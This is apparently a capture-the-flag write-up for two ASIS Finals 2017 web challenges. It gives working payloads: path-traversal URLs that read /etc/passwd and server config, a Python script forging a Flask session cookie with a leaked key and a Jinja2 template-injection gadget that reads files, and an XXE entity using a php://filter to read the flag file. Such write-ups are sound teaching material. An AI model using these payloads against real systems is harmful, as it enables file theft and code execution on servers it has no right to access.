# ASIS-FINALS-2017
Task name : Golem is stupid <br>
Category : Web <br>

Description :  Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid! <br>
<br>

tldr ; SSTI to get RCE in flask session token <br>

Challenge : <br>
first could find obvious LFI  https://golem.asisctf.com/article?name=../../../etc/passwd  and leak etc/passwd <br>
Trying leak other files gave us important infos : https://golem.asisctf.com/article?name=../../../../proc/self/cmdline <br>

https://golem.asisctf.com/article?name=../../../../../../etc/uwsgi/apps-enabled/golem_proj.ini was showing main script path file <br>

leaking that we can see that all parameters are kind of sanitized except token, which was then printed , looks like server side template injection<br>
All I had to do is create local flask app, forge my token using the key which was in the python file with payload, and send it to the application<br><br>

Payload : <br>
```
#creatig payload
from flask import Flask, session

app = Flask(__name__)

@app.route('/')
def run():
    session['golem'] = '{{ \'\'.__class__.__mro__[2].__subclasses__()[40](\'/opt/serverPython/golem/flag.py\').read() }}'
    return 'ok'
    

if __name__ == '__main__':
    app.secret_key = '7h15_5h0uld_b3_r34lly_53cur3d'
    app.run(host='127.0.0.1', port=2222, debug=True)
--------------------------------------------------------------------------------------------------------------------

#exploiting 
import requests

cookies={'session':'.eJwlyU0LgjAYAOC_Eu-5w9SCNugUOJl6iGgub21-QG4Z6Aab-N8zuj7PAv2oWwNkgZ0EAm0y9cwrKyL8kjQNKsJdoXEnBXObyVKj34WmYv-PeRDRacz5hMoUjcxjp7Kr29w3hvt7ptGTYlvEjZOUz0VcT49KWZUN7_x29HWVDvll6DuBzrDuYTYfIIdk_QL3ADJC.DJSUXQ.0_cgqMpbS89-sLEX2HaJRslq73I'}


r=requests.post('https://golem.asisctf.com/golem',cookies=cookies)

print r.text
```

<br>
Response contained flag : ASIS{I_L0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}


<br>
---------------------------------------------------------------------------------------------------------------------------------
<br>

Task name :  GSA File Server  <br>
Category : Web <br>

Description :  GSA's file server, go find the hole, drill it and grab the flag :)
Note that Scope is 128.199.40.185:* <br>
<br>

tldr ; Exploit XXE and Use a directory listing vuln to read flag<br>

Challenge : <br>
First find :http://128.199.40.185/showFiles was vuln to directory listing<br>
Second find : http://128.199.40.185:8081/panelManager-0.1/ XXE injection in docx file <br>
the solution was to download their doc file called (demo) open with archive and change inner xml (word/document.xml) with an xxe  php filter was working <br>
<!DOCTYPE roottag [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../fileSharing/s3cRetP4th/flagIsHeregRabiT.flag"> ]>
<br> the directory of the flag was found using the first vuln <br>
Flag : ASIS{Vuln_web_appZ_plus_misc0nfig_eQ_dis4st3R!}
